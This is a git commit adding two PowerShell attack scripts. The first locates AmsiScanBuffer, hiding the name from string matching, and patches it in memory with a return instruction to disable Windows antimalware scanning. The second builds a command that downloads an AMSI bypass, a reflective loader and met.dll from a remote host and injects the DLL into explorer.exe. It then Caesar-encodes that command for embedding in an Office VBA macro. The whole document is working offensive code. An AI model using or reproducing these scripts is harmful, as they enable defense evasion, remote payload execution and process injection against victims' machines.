0c778a0b92b8141ca81450ea82c861a1ec91bc10
Cole Strickler <82488869+ColeStrickler@users.noreply.github.com>
2022-09-23 13:37:08 -0600

    Add files via upload

---
+++ PatchingAMSI2.ps1
@@ -0,0 +1,76 @@
+﻿function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+
+$f = "Amsi" + $null + "Scan" + $null + "Buffer"
+
+[IntPtr]$funcAddr = LookupFunc amsi.dll $f
+$oldProtectionBuffer = 0
+
+$addr = '{0:X}' -f [Int64]$funcAddr
+Write-Output "Addr: 0x$addr"
+
+$funcaddr2 = LookupFunc kernel32.dll OpenProcess
+$addr2 = '{0:X}' -f [Int64]$funcAddr2
+
+Write-Output "Addr2: 0x$addr2"
+
+$funcaddr3 = LookupFunc kernel32.dll WriteProcessMemory
+$addr3 = '{0:X}' -f [Int64]$funcAddr3
+Write-Output "Addr3: 0x$addr3"
+
+
+#alot of this stuff was extra from when i was trying to find an alternative way to patch this but hey it worked
+
+
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$op = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([Int64]$funcaddr2), (getDelegateType @([Uint32], [Bool], [UInt32]) ([IntPtr])));
+$wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(($funcaddr3), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32]) ([Bool]))); 
+
+
+$gcp
+
+$procId = [Uint32]$pid
+
+
+$buf = [Byte[]] (0x90, 0x90, 0xC3) 
+$bufAddr = [IntPtr]
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
---
+++ basicCaesarCipherForVBA.ps1
@@ -0,0 +1,76 @@
+﻿$dollar = "$"
+$mod = "mod"
+$data = "data"
+$m = $dollar + $mod
+
+$d = $dollar + $data 
+$p = $dollar + "procId"
+
+$b = $dollar + "by"
+
+#modified PE Reflection script 
+$payload = "powershell -exec bypass -nop -c $b=(new-object system.net.webclient).downloadstring('http://192.168.49.59/patch2')| IEX;$m=(new-object system.net.webclient).downloadstring('http://192.168.49.59/Invoke-Reflection');IEX $m;$d=(new-object system.net.webclient).downloaddata('http://192.168.49.59/met.dll');$d;$p = (Get-Process -Name explorer).Id;$p;Invoke-Reflect -PEBytes $d -ProcId $p"
+#$payload = $bypass
+
+# This will generate the payload for the macro contained in VBAMacroCaesarCipher.txt
+
+
+
+[string]$output = ""
+
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 17
+    if($thischar.Length -eq 1)
+    {
+        $thischar = [string]"00" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 2)
+    {
+        $thischar = [string]"0" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 3)
+    {
+        $output += $thischar
+    }
+}
+
+
+#$output
+$i = 0 
+$j = 0
+$str = ""
+$final = ""
+ForEach($char in [char[]]$output.ToCharArray()){
+    $str = $str + $char
+    if ($i -eq 250) {
+        $final = $final + "out"+$j + "+"
+        "out"+$j+'="' + $str+ '"'
+        $str = ""
+        $j = $j + 1
+        $i = 0
+    }
+    $i = $i + 1
+
+    
+
+}
+
+if (($output.Length - ($j * 250)) -lt 250) {
+        $index = 0
+        $writeStr = ""
+        ForEach($char in [char[]]$output.ToCharArray()) {
+            if ($index -gt ($j * 250)) {
+                $writeStr = $writeStr + $char
+            } 
+            $index  = $index + 1
+        }
+        "out"+$j+'="' + $writeStr+ '"'
+        $final = $final + "out"+$j + "+"
+    } 
+
+
+$j = $j + 1
+"final=" + $final
+
